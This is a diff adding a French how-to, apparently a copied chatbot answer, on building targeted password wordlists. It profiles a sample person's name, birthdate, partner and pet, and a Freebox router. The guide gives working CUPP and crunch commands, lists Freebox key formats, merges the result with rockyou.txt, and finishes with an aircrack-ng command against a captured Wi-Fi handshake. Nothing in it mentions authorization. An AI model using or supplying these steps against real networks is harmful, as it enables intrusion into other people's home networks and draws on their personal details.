@@ -1,0 +1,99 @@
+Générer des mots de passe personnalisés à partir d’informations sur une personne (ou un appareil comme une Freebox) est une méthode classique de pentesting appelée attaque par dictionnaire ciblé ou attaque par profil.
+
+Voici comment faire un générateur de mots de passe personnalisés :
+
+🔐 1. Générer des mots de passe à partir d’informations (profiling)
+🧠 Exemple de profil :
+Info	Exemple
+Prénom	Thomas
+Nom	Dupont
+Date de naissance	12/05/1995
+Ville	Marseille
+Nom du chien	Rex
+Marque voiture	Peugeot
+Box Freebox	Freebox-87C1
+
+🛠️ 2. Outils de génération de mots de passe
+✅ Méthode rapide : Cupp (Common User Passwords Profiler)
+Installation :
+
+bash
+Copier
+Modifier
+git clone https://github.com/Mebus/cupp.git
+cd cupp
+python3 cupp.py -i
+Il te pose des questions comme :
+
+less
+Copier
+Modifier
+[+] Name: Thomas
+[+] Surname: Dupont
+[+] Nickname: toto
+[+] Birthdate: 12051995
+[+] Name of partner: Léa
+...
+À la fin, il te génère un fichier Thomas.txt avec des milliers de mots de passe possibles (ex : Thomas95, Thomas1205, toto1995, etc.)
+
+🔁 Méthode manuelle : avec crunch
+bash
+Copier
+Modifier
+sudo apt install crunch
+Par exemple, pour générer des mots de passe de 8 caractères commençant par freebox :
+
+bash
+Copier
+Modifier
+crunch 8 12 -t freebox@@@ -o freebox-pass.txt
+-t freebox@@@ : motif (les @ seront remplacés par des lettres)
+
+8 12 : min/max longueur
+
+-o : fichier de sortie
+
+📦 3. Exemple de mot de passe Freebox (observés)
+Voici les formats souvent utilisés pour les box Free :
+
+nginx
+Copier
+Modifier
+freebox1234
+FBX-AB12CD34
+AB12-CD34-EF56
+freebox_AB12
+Tu peux créer une liste personnalisée comme ça :
+
+bash
+Copier
+Modifier
+echo "freebox1234" >> list.txt
+echo "freebox_9876" >> list.txt
+echo "FBX-AB12CD34" >> list.txt
+echo "AB12-CD34-EF56" >> list.txt
+Ou utiliser crunch pour faire une variation réaliste :
+
+bash
+Copier
+Modifier
+crunch 14 14 -t FBX-@@@@@@## -o freebox-format.txt
+🧰 4. Fusionner plusieurs listes
+Si tu veux combiner :
+
+rockyou.txt
+
+tes listes Freebox
+
+une liste Cupp
+
+bash
+Copier
+Modifier
+cat rockyou.txt freebox-format.txt Thomas.txt > super-liste.txt
+Et tu l'utilises avec aircrack-ng :
+
+bash
+Copier
+Modifier
+sudo aircrack-ng -w super-liste.txt capture-01.cap
